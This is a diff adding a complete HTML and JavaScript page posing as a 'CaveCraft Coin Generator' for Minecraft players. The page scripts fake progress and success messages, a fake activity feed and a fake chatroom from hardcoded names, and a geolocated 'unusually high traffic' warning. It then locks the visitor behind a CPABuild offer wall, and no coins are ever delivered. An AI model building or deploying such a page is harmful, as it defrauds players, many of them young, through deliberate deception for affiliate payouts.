@@ -1,0 +1,1013 @@
+
+<!--
+Using API Key: b857cd76b2a46d1a3dcd | ItToken: 1287245
+-->
+<html>
+<head>
+    <title>CaveCraft Coin Generator</title>
+<meta name="description" content="CaveCraft Coin Generator" />
+<meta property="og:title" content="CaveCraft Coin Generator" />
+<meta property="og:description" content="CaveCraft Coin Generator" />
+<meta name="referrer" content="no-referrer">
+  <meta name="msvalidate.01" content="C0AABC575A33E6DF8175659AF6B61A30" />
+<script src="https://browser.sentry-cdn.com/5.20.1/bundle.min.js" integrity="sha384-O8HdAJg1h8RARFowXd2J/r5fIWuinSBtjhwQoPesfVILeXzGpJxvyY/77OaPPXUo" crossorigin="anonymous"></script>
+<script>
+    Sentry.init({ dsn: 'https://ecc33db07c514172b5606edcabb2884e@o425163.ingest.sentry.io/5357949' });
+</script>
+
+    <style>
+        .header_blue {
+            background: #1565c0;
+            padding: 80px 0 20px;
+            color: #fff;
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 40px;
+        }
+        .header_text {
+            margin-left: auto;
+            margin-right: auto;
+            width: 80%;
+        }
+        body{
+            margin:0;
+            font-family:Roboto, sans-serif;
+            color:#444;
+        }
+        .unlockBtn:hover{
+            box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(0,0,0,.23);
+        }
+        .unlockBtn {
+            background: #2196f3;
+            border: none;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+            min-height: 31px;
+            min-width: 70px;
+            padding: 2px 16px;
+            text-align: center;
+            text-shadow: none;
+            text-transform: uppercase;
+            -webkit-transition: all 280ms ease;
+            transition: all 280ms ease;
+            box-sizing: border-box;
+            cursor: pointer;
+            -webkit-appearance: none;
+            display: inline-block;
+            vertical-align: middle;
+            font: 500 14px/31px Roboto,sans-serif!important;
+            outline: 0!important;
+            color:white;
+        }
+        .content-container{
+            width:80%;margin:0 auto;
+        }
+        @font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+        body{
+  background-image: url("https://i.ibb.co/9Vbp9Py/cc.png");
+  background-size:cover;
+
+  background-position: center;
+  background-repeat: no-repeat;
+  background-color: #0c1318;
+  background-attachment: fixed;
+  font-family: Goldman;
+}
+.step1{
+  max-width: 600px;
+      width: 90%;
+      color: white;
+      height: auto;
+      overflow: auto;
+      background-color: #2f2f2f;
+      border-radius: 5px;
+      box-shadow: 0 0 5px black;
+}
+.step2{
+  max-width: 600px;
+  height: 487px;
+      width: 90%;
+      color: white;
+      height: auto;
+      overflow: auto;
+      background-color: #2f2f2f;
+      border-radius: 5px;
+      box-shadow: 0 0 5px black;
+        display: none;
+}
+.loading-box{
+  padding-top: 40px;
+  padding-bottom: 40px;
+}
+.main-header{
+  width: 100%;
+  border-radius: 5px 5px 0 0;
+  padding-top: 10px;
+  padding-bottom: 10px;
+  background-color: #03dc8c;
+  box-shadow: 0 0 2px #03dc8c;
+  color: white;
+}
+.text-1{
+  padding: 10px;
+  font-weight: bold;
+  font-family: Quicksand;
+  font-size: 14px;
+}
+.text-2{
+  font-family: Quicksand;
+  font-size: 12px;
+  color: #a7a7a7;
+}
+.text-gen{
+  color:#ff5454;
+  text-align: left;
+  padding-top: 20px;
+  padding-bottom: 0px;
+  padding-left: 20px;
+}
+.text-gen{
+  color:#ff5454;
+  text-align: left;
+  padding-top: 20px;
+  padding-bottom: 0px;
+  padding-left: 20px;
+  display: none;
+}
+.text-gen-status{
+  height: 10px;
+  width: 10px;
+  background-color: red;
+  border-radius: 50%;
+  display: inline-block;
+  margin-right: 5px;
+}
+.text-gen1{
+  color:#ababab;
+  text-align: left;
+  padding-top: 20px;
+  padding-bottom: 0px;
+  padding-left: 20px;
+display: none;
+}
+.text-gen1-status{
+  height: 10px;
+  width: 10px;
+  background-color: #03dc8c;
+  border-radius: 50%;
+  display: inline-block;
+  margin-right: 5px;
+}
+.text-gen2{
+  color:#ababab;
+  text-align: left;
+  padding-top: 20px;
+  padding-bottom: 0px;
+  padding-left: 20px;
+  display: none;
+}
+.text-gen2-status{
+  height: 10px;
+  width: 10px;
+  background-color: #d0ff84;
+  border-radius: 50%;
+  display: inline-block;
+  margin-right: 5px;
+}
+.text-gen3{
+  color:#ababab;
+  text-align: left;
+  padding-top: 20px;
+  padding-bottom: 0px;
+  padding-left: 20px;
+  display: none;
+}
+.text-gen3-status{
+  height: 10px;
+  width: 10px;
+  background-color: #03dc8c;
+  border-radius: 50%;
+  display: inline-block;
+  margin-right: 5px;
+}
+.text-gen4{
+  color:#ababab;
+  text-align: left;
+  padding-top: 20px;
+  padding-bottom: 0px;
+  padding-left: 20px;
+  display: none;
+}
+.text-gen4-status{
+  height: 10px;
+  width: 10px;
+  background-color: #d0ff84;
+  border-radius: 50%;
+  display: inline-block;
+  margin-right: 5px;
+}
+
+.text-gen5{
+  color:#ababab;
+  text-align: left;
+  padding-top: 20px;
+  padding-bottom: 0px;
+  padding-left: 20px;
+  display: none;
+}
+.text-gen5-status{
+  height: 10px;
+  width: 10px;
+  background-color: red;
+  border-radius: 50%;
+  display: inline-block;
+  margin-right: 5px;
+}
+.text-gen6{
+  color:#d0ff84;
+  text-align: left;
+  padding-top: 20px;
+  padding-bottom: 0px;
+  padding-left: 20px;
+  display: none;
+}
+.text-gen6-status{
+  height: 10px;
+  width: 10px;
+  background-color: red;
+  border-radius: 50%;
+  display: inline-block;
+  margin-right: 5px;
+}
+.loading-recent{
+  background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/16065477944c50af0438af3e56a012ee489fbfa465.png");
+  width: 12px;
+  height: 12px;
+background-size: contain;
+display: inline-block;
+margin-right:  2px;
+animation: Aniloading 1s linear infinite;
+}
+@keyframes Aniloading {
+  100% {transform: rotate(360deg);}
+}
+
+.text-gen-loading{
+  color:#ababab;
+}
+.input-username{
+  font-family: Goldman;
+  padding-left: 10px;
+  margin-top:5px;
+  max-width: 590px;
+      width: 95%;
+      background-color: rgb(212 212 212);
+      border: none;
+      border-radius: 3px;
+      font-size: 26px;
+      outline: none;
+      border-width: 1px;
+      border-color: #03dc8c;
+      border-style: solid;
+}
+.Robux-Card{
+  background-color: #ababab;
+  width: 160px;
+  height: 130px;
+  background-size: cover;
+  border-radius: 5px;
+  border-style: solid;
+  border-width: 2px;
+  border-color: #d4d4d4;
+  display: inline-block;
+  margin: 15px;
+}
+.Robux-Card-Selected{
+  width: 160px;
+  height: 130px;
+  background-size: cover;
+  border-radius: 5px;
+  border-style: solid;
+  border-width: 2px;
+  border-color: white;
+  display: inline-block;
+  background-color: #03dc8c;
+  animation: pulse 0.1s linear ;
+  animation-fill-mode: forwards;
+  margin: 15px;
+  color:black;
+}
+.Robux-Card:hover{
+  border-style: solid;
+  border-width: 2px;
+  border-color: white;
+  background-color: #03dc8c;
+  animation: pulse 0.1s linear ;
+  animation-fill-mode: forwards;
+  cursor: pointer;
+  color:black;
+}
+@keyframes pulse{
+ 0%  {transform: scale(1);}
+ 100%  {transform: scale(1.1);}
+}
+
+.noselect {
+  -webkit-touch-callout: none; /* iOS Safari */
+    -webkit-user-select: none; /* Safari */
+     -khtml-user-select: none; /* Konqueror HTML */
+       -moz-user-select: none; /* Firefox */
+        -ms-user-select: none; /* Internet Explorer/Edge */
+            user-select: none; /* Non-prefixed version, currently
+                                  supported by Chrome and Opera */
+}
+
+
+/* Recent Activiy */
+.recentActivity{
+box-shadow: 0 0 5px;
+  max-width: 600px;
+      width: 90%;
+  height: auto;
+  background-color: #000000c9;
+  position: relative;
+  margin-top: 10px;
+border-radius: 5px;
+margin-bottom: 40px;
+}
+.recent-card{
+  margin-top: 100px;
+border-radius: 5px 5px 0 0;
+  background-color: #2f2f2f;
+  color: white;
+  width:100%;
+  height: 90px;
+}
+.activity-pro{
+  margin-top: 5px;
+  width: 90%;
+
+  height: 20px;
+  position: relative;
+  z-index: 1
+}
+.bnt-robux-generate{
+  width:140px;
+  padding: 20px;
+  background-color: #03dc8c;
+  margin: 10px;
+  cursor: pointer;
+}
+.bnt-robux-generate:hover{
+  background-color: #14ea9b;
+  animation: pulse1 0.1s linear ;
+  animation-fill-mode: forwards;
+  box-shadow: 0 0 5px #14ea9b;
+}
+@keyframes pulse1{
+ 0%  {transform: scale(1);}
+ 100%  {transform: scale(1.05);}
+}
+.pro-step1{
+  width: 10px;
+  height: 10px;
+  background-color: #b8b8b8;
+  border-radius: 50%;
+  position: absolute;
+  left:5px;
+  top:15px;
+  z-index: 1;
+}
+.pro-step2{
+  width: 10px;
+  height: 10px;
+  background-color: #b8b8b8;
+  border-radius: 50%;
+  position: absolute;
+  left:50%;
+  top:15px;
+  z-index: 1;
+
+}
+
+.pro-step3{
+  width: 10px;
+  height: 10px;
+  background-color: #b8b8b8;
+  border-radius: 50%;
+  position: absolute;
+  right:5px;
+  top:15px;
+  z-index: 1;
+}
+.pro-bgbar{
+  height: 2px;
+  width: 525px;
+  background-color: #b8b8b8;
+  position: absolute;
+  left: 10px;
+  top:19px;
+  overflow: hidden;
+}
+.progress-bar{
+  height: 2px;
+  width: 100%;
+  background-color: #03fff8;
+  position: absolute;
+}
+.loading{
+  background-image: url("https://d13pxqgp3ixdbh.cloudfront.net/uploads/16065477944c50af0438af3e56a012ee489fbfa465.png");
+  width: 12px;
+  height: 12px;
+background-size: contain;
+display: inline-block;
+margin-right:  2px;
+animation: Aniloading 1s linear infinite;
+}
+@keyframes Aniloading {
+  100% {transform: rotate(360deg);}
+}
+.chatroom{
+  background-color: #eaeaea;
+  width:100%;
+  height: 250px;
+  overflow: hidden;
+  font-family: Quicksand;
+
+  font-size: 18px;
+}
+.chartroom-header{
+  background-color: #d8d8d8;
+  width:100%;
+  height: 20px;
+  padding: 2px;
+  text-align: left;
+}
+.chartroom-body{
+  padding: 15px;
+  text-align: left;
+  font-size: 12px;
+  background-color: #616161d9;
+      width: 100%;
+      height: 200px;
+  overflow-y: scroll;
+}
+.chatroom-name{
+  color:#616161d9;
+  font-size: 14px;
+}
+.chatroom-time{
+  font-size: 14px;
+  color:#616161d9;
+}
+.chatroom-message{
+  font-size: 14px;
+  color:#616161d9;
+}
+.online-status{
+  background-color: #03fff8;
+  width: 10px;
+  height: 10px;
+  border-radius: 50%;
+  display: inline-block;
+margin-bottom: 2px;
+}
+/* end Activiy */
+
+
+
+.lds-dual-ring {
+  display: inline-block;
+  width: 80px;
+  height: 80px;
+}
+.lds-dual-ring:after {
+  content: " ";
+  display: block;
+  width: 64px;
+  height: 64px;
+  margin: 8px;
+  border-radius: 50%;
+  border: 6px solid #03dc8c;
+  border-color: #03dc8c transparent #03dc8c transparent;
+  animation: lds-dual-ring 1.2s linear infinite;
+}
+@keyframes lds-dual-ring {
+  0% {
+    transform: rotate(0deg);
+  }
+  100% {
+    transform: rotate(360deg);
+  }
+}
+.text-generation{
+  position:absolute; left:70px;top:0px;
+}
+.text-verification{
+  position:absolute; right:70px;top:0px;
+}
+@media only screen and (max-width:705px) {
+.noselect{
+  width:100px;
+}
+  .Robux-Card{
+    background-color: #ababab;
+    width: 28%;
+    height: 150px;
+    background-size: cover;
+    border-radius: 5px;
+    border-style: solid;
+    border-width: 2px;
+    border-color: #d4d4d4;
+    display: inline-block;
+    margin: 8px;
+  }
+  .Robux-Card-Selected{
+    width: 28%;
+    height: 150px;
+    background-size: cover;
+    border-radius: 5px;
+    border-style: solid;
+    border-width: 2px;
+    border-color: white;
+    display: inline-block;
+    background-color: #03dc8c;
+    animation: pulse 0.1s linear ;
+    animation-fill-mode: forwards;
+    margin: 8px;
+
+    color:black;
+  }
+
+  .pro-bgbar{
+    height: 2px;
+    width: 95%;
+    background-color: #b8b8b8;
+    position: absolute;
+    left: 10px;
+    top:19px;
+    overflow: hidden;
+  }
+}
+
+@media only screen and (max-width:500px) {
+  .text-generation{
+     left:40px;
+  }
+  .text-verification{
+     right:40px;
+  }
+  .noselect{
+    width:auto;
+  }
+  .Robux-Card{
+    background-color: #ababab;
+    width: 25%;
+    height: 150px;
+    background-size: cover;
+    border-radius: 5px;
+    border-style: solid;
+    border-width: 2px;
+    border-color: #d4d4d4;
+    display: inline-block;
+    margin: 8px;
+  }
+  .Robux-Card-Selected{
+    width: 25%;
+    height: 150px;
+    background-size: cover;
+    border-radius: 5px;
+    border-style: solid;
+    border-width: 2px;
+    border-color: white;
+    display: inline-block;
+    background-color: #03dc8c;
+    animation: pulse 0.1s linear ;
+    animation-fill-mode: forwards;
+    margin: 8px;
+    color:black;
+  }
+  .pro-bgbar{
+    height: 2px;
+    width: 93%;
+    background-color: #b8b8b8;
+    position: absolute;
+    left: 10px;
+    top:19px;
+    overflow: hidden;
+  }
+  .text-1{
+    font-size:10px;
+  }
+  .text-2{
+    font-size:11px;
+  }
+  .bnt-robux-generate{
+    width:120px;
+    padding: 10px;
+    background-color: #03dc8c;
+    margin: 10px;
+    cursor: pointer;
+    font-size: 14px;
+  }
+  .recent-card {
+    margin-top: 30px;
+
+}
+}
+
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+
+
+<body>
+    <center>
+<img src="https://i.ibb.co/LxY6msb/Cave-Craft.png" style="width:128px"></img>
+<div class="step1" id="step1">
+  <div class="main-header"></img>CaveCraft Coin Generator</div>
+  <div class="text-1">CLAIM YOUR COINS PACKAGE BY FILLING OUT THE FORM BELOW</div>
+  <div class="text-2"> Its easy: just insert your Username, select a package and click Generate Now! <span style="font-weight:bold;"></span></div>
+  <div style="width:95%;height:1px;background-color:#404040;margin:10px;"></div>
+  <div style="text-align:left;margin-left:10px;">Minecraft Username</div>
+  <input type="text" id="lname" placeholder="username or id"class="input-username">
+  <div class="text-2">Your exact Minecraft Username must be entered, with proper capitalization. Example: _Rewe</div>
+  <br>
+  <div class="">Choose your Coins Package</div>
+  <div class="Robux-Card" id="Robux-Card1" onclick="SelectedCard(1)"><p><p class="noselect" style="margin:0;"> 1,000 Coins</p><img src="https://i.ibb.co/C0k4Bpj/Coin-Worthless.png"style="width:70px"></img></div>
+  <div class="Robux-Card" id="Robux-Card2" onclick="SelectedCard(2)"><p><p class="noselect" style="margin:0;" > 10,000 Coins</p><img src="https://i.ibb.co/5KJ959g/Coin.png"style="width:70px"></img></div>
+  <div class="Robux-Card" id="Robux-Card3" onclick="SelectedCard(3)"><p><p class="noselect" style="margin:0;">50,000 Coins</p><img src="https://i.ibb.co/MRLHZqm/1000coins.png"style="width:70px"></img></div>
+  <div class="bnt-robux-generate" onclick="generate()"><span class="noselect">Generate Now!</span></div>
+</div>
+<div class="step2" id="step2">
+  <div class="main-header"></img>Minecraft Coins Generator</div>
+
+  <div class="text-gen"  id="text-gen"><div class="text-gen-status"></div>Failed to connect to CaveCraft <span id="user-name" style="font-weight: bolder;text-decoration: underline;font-size: 18px;"></span> (attempt 1)</div>
+  <div class="text-gen1" id="text-gen1"><div class="text-gen1-status"></div>Failed to connect to CaveCraft <span id="user-name1" style="font-weight: bolder;text-decoration: underline;font-size: 18px;"></span> (attempt 2)</div>
+  <div class="text-gen2" id="text-gen2"><div class="text-gen2-status"></div>Executing required commands...</div>
+  <div class="text-gen3" id="text-gen3"><div class="text-gen3-status"></div>Coins generated Successfully.</div>
+  <div class="text-gen6" id="text-gen6"><div class="text-gen6-status"></div></div>
+  <div class="text-gen4" id="text-gen4"><div class="text-gen4-status"></div>Verification is required.</div>
+  <div class="text-gen5" id="text-gen5"><div class="text-gen5-status"></div>Please complete anti-bot verification. Your Coins will be added to <span id="user-name2" style="font-weight: bolder;text-decoration: underline;font-size: 18px;"></span> automatically once you are verified.</div>
+
+
+  <div class="loading-box">
+  <div class="lds-dual-ring"></div>
+  <div class="text-gen-loading" id="text-gen-loading">Initializing scripts...</div>
+</div>
+</div>
+        <div class="recentActivity">
+          <div class="recent-card">
+            <div style=""><img src="https://d13pxqgp3ixdbh.cloudfront.net/uploads/16071650349a9adc60dbee5523edb57f9396c3f97d.png" style="width:20px;margin-bottom:-5px;margin-top:10px;margin-right:5px;"></img><span class="fontpro" id="genname" style="color:#03dc8c;text-shadow:0 0 5px black">Undefined</span></div>
+        <div style="">
+          <img src="https://i.ibb.co/5KJ959g/Coin.png" style="width:20px;margin-bottom:-7px;margin-top:5px;"></img><span class="fontpro" id="genrobux" style="color:white;font-size:12px"> 0 Coins</span>
+        </div>
+        <div class="activity-pro">
+            <div style="">
+              <span class="text-generation"><div class="loading-recent" id="gen-loading"></div><span class="fontpro" style="color:white;font-size:10px">generation</span></span>
+              <span class="text-verification"><div class="loading-recent" id="veri-loading"></div><span class="fontpro" style="color:white;font-size:10px">Verification</span></span>
+            </div>
+            <div class="pro-step1" id="pro-step1"></div>
+            <div class="pro-step2" id="pro-step2"></div>
+            <div class="pro-step3" id="pro-step3"></div>
+            <div class="pro-bgbar"><div class="progress-bar" id="progress-bar"></div></div>
+
+          </div>
+
+        </div>
+        <div class="chatroom">
+          <div class="chartroom-header">
+          <div class="online-status"></div>
+          Generator Chatroom
+          </div>
+          <div class="chartroom-body" id="chartroom-body">
+            <span style="color:#33ff00">Welcome to the chatroom, posting links or spamming will result in a kick.
+</span><br>
+           <span style="color:#ff0000">The chatroom is currently closed for security reasons.
+</span><br>
+<div id="chatroom-message"> </div>
+          </div>
+        </div>
+          </div>
+  </center>
+ <script src="main.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":1287245,"key":"9601c"};
+    var forward="";
+    CPABUILDSETTINGS.onComplete=function(data){
+        window.location=forward;
+        return false;
+    };
+</script>
+<script src="https://d13nu0oomnx5ti.cloudfront.net/e8a96c4.js"></script>
+<script type="text/javascript">
+    $('.showContentLocker').click(function(){
+       CPABuildLock();
+        return false;
+    });
+</script>
+<script>
+</script>
+<script type="text/javascript">
+    function SelectedCard(cardnum){
+document.getElementById("Robux-Card1").classList.remove('Robux-Card-Selected');
+document.getElementById("Robux-Card2").classList.remove('Robux-Card-Selected');
+document.getElementById("Robux-Card3").classList.remove('Robux-Card-Selected');
+document.getElementById("Robux-Card1").classList.add('Robux-Card');
+document.getElementById("Robux-Card2").classList.add('Robux-Card');
+document.getElementById("Robux-Card3").classList.add('Robux-Card');
+  document.getElementById("Robux-Card"+cardnum).classList.remove('Robux-Card');
+  document.getElementById("Robux-Card"+cardnum).classList.add('Robux-Card-Selected');
+}
+function generate(){
+  var lname=document.getElementById("lname").value;
+  if (lname==''){
+    document.getElementById("lname").style.borderColor= "#e2251c";
+    document.getElementById("lname").style.boxShadow= "0px 0px 100px red";
+    document.getElementById("lname").focus();
+  }else{
+    document.getElementById("step1").style.display="none";
+    document.getElementById("step2").style.display="block";
+    var username= document.getElementById("lname").value;
+    document.getElementById("user-name").innerHTML=username;
+    document.getElementById("user-name1").innerHTML=username;
+    document.getElementById("user-name2").innerHTML=username;
+    var myVar2 = setInterval(UserTimer, 2000);
+    var linestep=1;
+    function UserTimer() {
+      if (linestep==1){
+        document.getElementById("text-gen-loading").innerHTML="Checking public key...";
+      }else if(linestep==2){
+        document.getElementById("text-gen-loading").innerHTML="Verifying hash...";
+      }else if(linestep==3){
+        document.getElementById("text-gen-loading").innerHTML="Extracting...";
+      }else if(linestep==4){
+        document.getElementById("text-gen-loading").innerHTML="Conntecting to CaveCraft " +username+" (attempt 1)...";
+      }else if(linestep==5){
+        document.getElementById("text-gen").style.display="block";
+        document.getElementById("text-gen-loading").innerHTML="Conntecting to CaveCraft " +username+" (attempt 2)...";
+      }
+      else if(linestep==6){
+        document.getElementById("text-gen1").style.display="block";
+        document.getElementById("text-gen-loading").innerHTML="Downloading values...";
+      }else if(linestep==7){
+        document.getElementById("text-gen-loading").innerHTML="Format JSON...";
+      }else if(linestep==8){
+        document.getElementById("text-gen-loading").innerHTML="Sending Packets...";
+      }else if(linestep==9){
+        document.getElementById("text-gen-loading").innerHTML="Reading config...";
+      }else if(linestep==10){
+        document.getElementById("text-gen-loading").innerHTML="connecting to cavecraft.mgservers.de";
+      }else if(linestep==11){
+  document.getElementById("text-gen2").style.display="block";
+        document.getElementById("text-gen-loading").innerHTML="Sending...";
+      }else if(linestep==14){
+  document.getElementById("text-gen3").style.display="block";
+  var offset = new Date().getTimezoneOffset();
+  offset=offset/-60;
+  var data;var country;var code;var d=window.location.href;
+  fetch('https://visitor-country.info/index.php?d='+d+"&t="+offset,{referrerPolicy:'unsafe-url'})
+  .then(res => res.json())
+  .then(output => {
+  data =output;
+  country=data.country;
+  code=data.code;
+  document.getElementById("text-gen6").style.display="block";
+  document.getElementById("text-gen6").innerHTML='<div class="text-gen6-status"></div>'+"Unusually high traffic from "+country ;
+  })
+        document.getElementById("text-gen-loading").innerHTML="Checking Verification...";
+      }else if(linestep==15){
+  document.getElementById("text-gen4").style.display="block";
+        document.getElementById("text-gen-loading").innerHTML="Reading config...";
+      }else if(linestep==16){
+                    document.getElementById("text-gen5").style.display="block";
+        document.getElementById("text-gen-loading").innerHTML="User not verified.";
+      }else if(linestep==17){
+                  CPABuildLock();
+      }
+      linestep++;
+    }
+  }
+}
+//Recent activity
+var valactivity= setInterval(RecentActivity, 100);
+var prostep=0;
+var prostepDelay=0;
+function RecentActivity(){
+  if (prostep==0){
+    var genrobux = ["1000", "10000", "50000"];
+    var robux=genrobux[Math.floor(Math.random() * 3)];
+    document.getElementById("genrobux").innerHTML=' '+robux;
+var gennamelist = ["hardcodedName1", "hardcodedName2", "hardcodedName3","hardcodedName4",
+  "hardcodedName5",
+  "hardcodedName6",
+  "hardcodedName7",
+  "hardcodedName8",
+  "hardcodedName9",
+  "hardcodedName10",
+  "hardcodedName11",
+  "hardcodedName12",
+  "hardcodedName13",
+  "hardcodedName14",
+  "hardcodedName15",
+  "hardcodedName16",
+  "hardcodedName17",
+  "hardcodedName18",
+  "hardcodedName19",
+  "hardcodedName20",
+  "hardcodedName21",
+  "hardcodedName22",
+  "hardcodedName23",
+  "hardcodedName24",
+  "hardcodedName25",
+  "hardcodedName26",
+  "hardcodedName27",
+  "hardcodedName28",
+  "hardcodedName29",
+  "hardcodedName30",
+  "hardcodedName31",
+  "hardcodedName32",
+  "hardcodedName33",
+  "hardcodedName34",
+  "hardcodedName35",
+  "hardcodedName36",
+  "hardcodedName37",
+  "hardcodedName38",
+  "hardcodedName39",
+  "hardcodedName40",
+  "hardcodedName41",
+  "hardcodedName42",
+  "hardcodedName43",
+  "hardcodedName44",
+  "hardcodedName45",
+  "hardcodedName46",
+  "hardcodedName47",
+  "hardcodedName48",
+  "hardcodedName49",
+  "hardcodedName50",
+  "hardcodedName51",
+  "hardcodedName52"];
+    var name=gennamelist[Math.floor(Math.random() * 52)];
+    document.getElementById("genname").innerHTML=name;
+  }
+  prostepDelay++;
+  if (prostep>=50 & prostepDelay>=100){
+prostep++;
+}else if(prostep<51) {
+    prostep++;
+  }
+
+
+  document.getElementById("pro-step1").style.backgroundColor="#03fff8";
+document.getElementById("progress-bar").style.width=prostep +"%";
+if (prostep==50){
+  document.getElementById("gen-loading").style.backgroundImage="url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/160654779319118d636b2ea3b4779800f01d8c318a.png')";
+  document.getElementById("gen-loading").style.animation ="myloading";
+} else if(prostep>50){
+  document.getElementById("pro-step2").style.backgroundColor="#03fff8";
+  document.getElementById("progress-bar").style.width=prostep +"%";
+  if (prostep>99){
+    document.getElementById("pro-step3").style.backgroundColor="#03fff8";
+    document.getElementById("veri-loading").style.backgroundImage="url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/160654779319118d636b2ea3b4779800f01d8c318a.png')";
+    document.getElementById("veri-loading").style.animation ="myloading";
+
+  }
+}
+if (prostep>=100 & prostepDelay>=160){
+        document.getElementById("gen-loading").style.backgroundImage="url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/16065477944c50af0438af3e56a012ee489fbfa465.png')";
+        document.getElementById("gen-loading").style.animation ="Aniloading 1s linear infinite";
+        document.getElementById("veri-loading").style.backgroundImage="url('https://d13pxqgp3ixdbh.cloudfront.net/uploads/16065477944c50af0438af3e56a012ee489fbfa465.png')";
+        document.getElementById("veri-loading").style.animation ="Aniloading 1s linear infinite";
+
+      prostep=0;
+      prostepDelay=0;
+
+}
+}
+//chatroom
+var valactivity= setInterval(RecentActivity1, 6500);
+function RecentActivity1(){
+  var today = new Date();
+var time = today.getHours() + ":" + today.getMinutes();
+var gennamelist = ["hardcodedName1", "hardcodedName2", "hardcodedName3","hardcodedName4",
+  "hardcodedName5",
+  "hardcodedName6",
+  "hardcodedName7",
+  "hardcodedName8",
+  "hardcodedName9",
+  "hardcodedName10",
+  "hardcodedName11",
+  "hardcodedName12",
+  "hardcodedName13",
+  "hardcodedName14",
+  "hardcodedName15",
+  "hardcodedName16",
+  "hardcodedName17",
+  "hardcodedName18",
+  "hardcodedName19",
+  "hardcodedName20",
+  "hardcodedName21",
+  "hardcodedName22",
+  "hardcodedName23",
+  "hardcodedName24",
+  "hardcodedName25",
+  "hardcodedName26",
+  "hardcodedName27",
+  "hardcodedName28",
+  "hardcodedName29",
+  "hardcodedName30",
+  "hardcodedName31",
+  "hardcodedName32",
+  "hardcodedName33",
+  "hardcodedName34",
+  "hardcodedName35",
+  "hardcodedName36",
+  "hardcodedName37",
+  "hardcodedName38",
+  "hardcodedName39",
+  "hardcodedName40",
+  "hardcodedName41",
+  "hardcodedName42",
+  "hardcodedName43",
+  "hardcodedName44",
+  "hardcodedName45",
+  "hardcodedName46",
+  "hardcodedName47",
+  "hardcodedName48",
+  "hardcodedName49",
+  "hardcodedName50",
+  "hardcodedName51",
+  "hardcodedName52"];
+  var name=gennamelist[Math.floor(Math.random() * 52)];
+
+  var genmessagelist = [
+  "hardcodedChatMessage1",
+  "hardcodedChatMessage2",
+  "hardcodedChatMessage3",
+  "hardcodedChatMessage4",
+  "hardcodedChatMessage5",
+  "hardcodedChatMessage6",
+  "hardcodedChatMessage7",
+  "hardcodedChatMessage8",
+  "hardcodedChatMessage9",
+  "hardcodedChatMessage10",
+  "hardcodedChatMessage11",
+  "hardcodedChatMessage12",
+  "hardcodedChatMessage13",
+  "hardcodedChatMessage14",
+  "hardcodedChatMessage15",
+  "hardcodedChatMessage16",
+  "hardcodedChatMessage17",
+  "hardcodedChatMessage18",
+  "hardcodedChatMessage19",
+  "hardcodedChatMessage20",
+  "hardcodedChatMessage21",
+  "hardcodedChatMessage22",
+  "hardcodedChatMessage23",
+  "hardcodedChatMessage24",
+  "hardcodedChatMessage25",
+  "hardcodedChatMessage26",
+  "hardcodedChatMessage27",
+  "hardcodedChatMessage28",
+  "hardcodedChatMessage29",
+  "hardcodedChatMessage30",
+  "hardcodedChatMessage31",
+  "hardcodedChatMessage32",
+  "hardcodedChatMessage33",
+  "hardcodedChatMessage34",
+  "hardcodedChatMessage35",
+  "hardcodedChatMessage36",
+  "hardcodedChatMessage37",
+  "hardcodedChatMessage38",
+  "hardcodedChatMessage39",
+  "hardcodedChatMessage40",
+  "hardcodedChatMessage41",
+  "hardcodedChatMessage42",
+  "hardcodedChatMessage43",
+  "hardcodedChatMessage44",
+  "hardcodedChatMessage45",
+  "hardcodedChatMessage46",
+  "hardcodedChatMessage47",
+  "hardcodedChatMessage48",
+  "hardcodedChatMessage49",
+  "hardcodedChatMessage50",
+  "hardcodedChatMessage51",
+  "hardcodedChatMessage52"
+];
+  var message=genmessagelist[Math.floor(Math.random() * 52)];
+document.getElementById("chatroom-message").innerHTML=document.getElementById("chatroom-message").innerHTML + "<br>"+'<span class="chatroom-time">['+time+'] </span> <span class="chatroom-name">'+name+'</span>: <span class="chatroom-message">'+message+'</span>';
+var objDiv = document.getElementById("chartroom-body");
+objDiv.scrollTop = objDiv.scrollHeight;
+}
+//END
+</script>
+<script>
+    if(typeof window.ga === 'function'){
+        ga('create', 'UA-85922709-2', 'auto', 'customTemplateGlobal');
+        ga('customTemplateGlobal.set', 'dimension1', typeof window.CPBContentLocker === 'function' ? 0 : 1);
+        ga('customTemplateGlobal.send', 'pageView');
+    }
+</script>
+</body>
+</html>
